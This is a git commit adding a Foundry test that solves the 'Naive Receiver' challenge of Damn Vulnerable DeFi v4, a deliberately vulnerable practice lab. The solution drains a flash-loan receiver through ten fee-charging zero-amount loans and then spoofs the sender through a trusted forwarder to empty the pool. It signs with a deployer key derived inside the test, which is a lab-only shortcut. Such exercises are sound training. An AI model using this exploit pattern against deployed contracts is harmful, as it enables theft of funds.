f8e8c338123ede42b3f8ebe52eb1fa4d6a899fad
KalpShah-ETH <kalps5341@gmail.com>
2025-08-25 17:41:04 +0530

    Add files via upload

---
+++ NaiveReceiver.t.sol
@@ -0,0 +1,159 @@
+// SPDX-License-Identifier: MIT
+// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
+pragma solidity =0.8.25;
+
+import {Test, console} from "forge-std/Test.sol";
+import {NaiveReceiverPool, Multicall, WETH} from "../../src/naive-receiver/NaiveReceiverPool.sol";
+import {FlashLoanReceiver} from "../../src/naive-receiver/FlashLoanReceiver.sol";
+import {BasicForwarder} from "../../src/naive-receiver/BasicForwarder.sol";
+import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+
+contract NaiveReceiverChallenge is Test {
+    address deployer = makeAddr("deployer");
+    address recovery = makeAddr("recovery");
+    address player;
+    uint256 playerPk;
+
+    uint deployerpk;
+    uint256 constant WETH_IN_POOL = 1000e18;
+    uint256 constant WETH_IN_RECEIVER = 10e18;
+
+    NaiveReceiverPool pool;
+    WETH weth;
+    FlashLoanReceiver receiver;
+    BasicForwarder forwarder;
+
+    modifier checkSolvedByPlayer() {
+        vm.startPrank(player, player);
+        _;
+        vm.stopPrank();
+        _isSolved();
+    }
+
+    /**
+     * SETS UP CHALLENGE - DO NOT TOUCH
+     */
+    function setUp() public {
+        (player, playerPk) = makeAddrAndKey("player");
+        startHoax(deployer);
+        (, deployerpk) = makeAddrAndKey("deployer");
+        // Deploy WETH
+        weth = new WETH();
+
+        // Deploy forwarder
+        forwarder = new BasicForwarder();
+
+        // Deploy pool and fund with ETH
+        pool = new NaiveReceiverPool{value: WETH_IN_POOL}(
+            address(forwarder),
+            payable(weth),
+            deployer
+        );
+
+        // Deploy flashloan receiver contract and fund it with some initial WETH
+        receiver = new FlashLoanReceiver(address(pool));
+        weth.deposit{value: WETH_IN_RECEIVER}();
+        weth.transfer(address(receiver), WETH_IN_RECEIVER);
+
+        vm.stopPrank();
+    }
+
+    function test_assertInitialState() public {
+        // Check initial balances
+        assertEq(weth.balanceOf(address(pool)), WETH_IN_POOL);
+        assertEq(weth.balanceOf(address(receiver)), WETH_IN_RECEIVER);
+
+        // Check pool config
+        assertEq(pool.maxFlashLoan(address(weth)), WETH_IN_POOL);
+        assertEq(pool.flashFee(address(weth), 0), 1 ether);
+        assertEq(pool.feeReceiver(), deployer);
+
+        // Cannot call receiver
+        vm.expectRevert(bytes4(hex"48f5c3ed"));
+        receiver.onFlashLoan(
+            deployer,
+            address(weth), // token
+            WETH_IN_RECEIVER, // amount
+            1 ether, // fee
+            bytes("") // data
+        );
+    }
+
+    /**
+     * CODE YOUR SOLUTION HERE
+     */
+    function test_naiveReceiver() public checkSolvedByPlayer {
+        bytes[] memory calls = new bytes[](10);
+
+        for (uint256 i = 0; i < 10; i++) {
+            calls[i] = abi.encodeWithSignature(
+                "flashLoan(address,address,uint256,bytes)",
+                address(receiver),
+                address(weth),
+                0,
+                ""
+            );
+        }
+        pool.multicall(calls);
+
+        console.log(weth.balanceOf(address(pool)));
+        console.log(vm.getNonce(player));
+
+        bytes memory calldatas = new bytes(1);
+        calldatas = abi.encodePacked(
+            abi.encodeCall(
+                pool.withdraw,
+                (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))
+            ),
+            (bytes32(uint(uint160(deployer))))
+        );
+        BasicForwarder.Request memory request = BasicForwarder.Request(
+            deployer,
+            address(pool),
+            0,
+            gasleft(),
+            forwarder.nonces(player),
+            calldatas,
+            1 days
+        );
+
+        bytes32 structHash = forwarder.getDataHash(request);
+        bytes32 digest = keccak256(
+            abi.encodePacked(hex"1901", forwarder.domainSeparator(), structHash)
+        );
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(deployerpk, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
+
+        forwarder.execute(request, signature);
+    }
+
+    /**
+     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
+     */
+    function _isSolved() private view {
+        // Player must have executed two or less transactions
+        assertLe(vm.getNonce(player), 2);
+
+        // The flashloan receiver contract has been emptied
+        assertEq(
+            weth.balanceOf(address(receiver)),
+            0,
+            "Unexpected balance in receiver contract"
+        );
+
+        // Pool is empty too
+        assertEq(
+            weth.balanceOf(address(pool)),
+            0,
+            "Unexpected balance in pool"
+        );
+
+        // All funds sent to recovery account
+        assertEq(
+            weth.balanceOf(recovery),
+            WETH_IN_POOL + WETH_IN_RECEIVER,
+            "Not enough WETH in recovery account"
+        );
+    }
+}
